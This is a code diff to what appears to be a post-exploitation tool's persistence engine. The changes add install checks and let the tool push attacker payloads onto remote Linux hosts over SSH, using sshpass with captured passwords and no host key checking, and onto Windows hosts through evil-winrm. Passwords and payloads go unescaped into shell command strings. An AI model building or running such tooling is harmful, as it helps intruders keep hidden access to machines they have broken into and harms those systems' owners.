@@ -17,6 +17,7 @@ from typing import Optional, List, Dict, Any
 from enum import Enum
 
 from . import db
+from .tools_manager import tool_installed, tool_run_shell
 
 
 class PersistOS(Enum):
@@ -250,14 +251,20 @@ class PersistenceEngine:
                      credential: str = "", keyfile: str = "",
                      port: int = 22) -> Dict:
         """通过 SSH 部署 Linux 持久化"""
+        if not tool_installed("ssh"):
+            return {"status": "not_installed", "hint": "安装: apt install openssh-client"}
         ssh_cmd = f"ssh -o StrictHostKeyChecking=no -p {port} "
         if keyfile:
             ssh_cmd += f"-i {keyfile} "
-        elif credential and ":" in credential:
+        if credential and ":" in credential:
             user, pw = credential.split(":", 1)
             ssh_cmd += f"{user}@{target} "
         else:
             ssh_cmd += f"{target} "
+        # 用 sshpass 如果有密码
+        if credential and ":" in credential and not keyfile:
+            _, pw = credential.split(":", 1)
+            ssh_cmd = f"sshpass -p '{pw}' " + ssh_cmd
         ssh_cmd += f"'{payload.command}'"
         try:
             r = subprocess.run(ssh_cmd, shell=True, capture_output=True, text=True, timeout=30)
@@ -269,6 +276,10 @@ class PersistenceEngine:
     def deploy_windows(self, target: str, payload: PersistPayload,
                        credential: str = "") -> Dict:
         """通过 evil-winrm 部署 Windows 持久化"""
+        if not tool_installed("evil-winrm"):
+            return {"status": "not_installed",
+                    "hint": "安装: gem install evil-winrm",
+                    "command": f"evil-winrm -i {target} -e '{payload.command[:200]}'"}
         ew_cmd = f"evil-winrm -i {target} "
         if credential and ":" in credential:
             u, p = credential.split(":", 1)
